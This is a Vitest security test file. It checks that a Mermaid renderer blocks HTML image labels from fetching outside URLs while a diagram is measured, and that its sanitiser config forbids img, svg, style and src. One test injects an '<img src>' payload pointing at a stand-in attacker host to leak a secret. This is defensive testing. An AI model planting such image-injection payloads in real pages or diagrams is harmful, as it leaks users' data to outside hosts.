/**
 * A label Mermaid writes as HTML is words. An architecture service's `iconText` is written
 * with `.html()` whatever `htmlLabels` says, and Mermaid draws in the live page to measure, so
 * a picture in it was fetched before the drawing became an image. Real Mermaid, drawn.
 */
import { describe, it, expect, afterEach, beforeEach, vi } from 'vitest';
import { aparteGlobalConfig, type AparteCodeLanguageContext } from '@aparte/core';
import { setupMermaidWith, type MermaidLike } from './core.js';

const ATTACKER = 'https://attacker.example/arch?d=SECRET';

beforeEach(() => {
    // jsdom lays nothing out: Mermaid measures text and boxes, and gets numbers.
    vi.spyOn(HTMLCanvasElement.prototype, 'getContext').mockReturnValue(null);
    const proto = SVGElement.prototype as SVGElement & { getBBox?: () => DOMRect; getComputedTextLength?: () => number };
    if (!proto.getBBox) proto.getBBox = () => ({ x: 0, y: 0, width: 40, height: 16, top: 0, left: 0, right: 40, bottom: 16, toJSON: () => ({}) }) as DOMRect;
    if (!proto.getComputedTextLength) proto.getComputedTextLength = () => 40;
});

afterEach(() => {
    aparteGlobalConfig.reset();
    document.body.innerHTML = '';
    vi.restoreAllMocks();
});

describe('a label Mermaid writes as HTML', () => {
    it('puts no picture in the page, not even while the diagram is measured', async () => {
        const real = (await import('mermaid')).default;
        setupMermaidWith(real as unknown as MermaidLike);
        const seen: string[] = [];
        // Every element added to the page, even one Mermaid takes out again once measured.
        const scan = (records: MutationRecord[]): void => {
            for (const record of records) {
                for (const node of record.addedNodes) {
                    if (!(node instanceof Element)) continue;
                    for (const el of [node, ...node.querySelectorAll('*')]) {
                        for (const name of ['src', 'srcset', 'href', 'xlink:href', 'poster']) {
                            const value = el.getAttribute(name);
                            if (value?.includes('attacker.example')) seen.push(`${el.localName} ${name}`);
                        }
                    }
                }
            }
        };
        const observer = new MutationObserver(scan);
        observer.observe(document, { childList: true, subtree: true });
        const host = document.createElement('code');
        document.body.append(host);
        await aparteGlobalConfig.getCodeLanguageRenderer('mermaid')!.render({
            language: 'mermaid',
            source: `architecture-beta\n    service s1 "<img src=${ATTACKER}>" [Title]\n`,
            display: true, open: false, host, config: aparteGlobalConfig,
        } as AparteCodeLanguageContext);
        scan(observer.takeRecords());
        observer.disconnect();
        expect(seen).toEqual([]);
    });

    it('keeps the rule from a diagram’s own init', async () => {
        const configs: Record<string, unknown>[] = [];
        setupMermaidWith({
            initialize: (config) => { configs.push(config); },
            parse: () => Promise.resolve(true),
            render: () => Promise.resolve({ svg: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"></svg>' }),
        });
        const host = document.createElement('code');
        document.body.append(host);
        await aparteGlobalConfig.getCodeLanguageRenderer('mermaid')!.render({
            language: 'mermaid', source: 'flowchart LR\n  A --> B', display: true, open: false, host, config: aparteGlobalConfig,
        } as AparteCodeLanguageContext);
        const config = configs.at(-1)!;
        const purify = config['dompurifyConfig'] as { FORBID_TAGS: string[]; FORBID_ATTR: string[] };
        expect(purify.FORBID_TAGS).toEqual(expect.arrayContaining(['style', 'img', 'image', 'svg', 'video', 'audio', 'source', 'picture']));
        expect(purify.FORBID_ATTR).toEqual(expect.arrayContaining(['src', 'srcset', 'style']));
        expect(config['secure']).toContain('dompurifyConfig');
    });
});
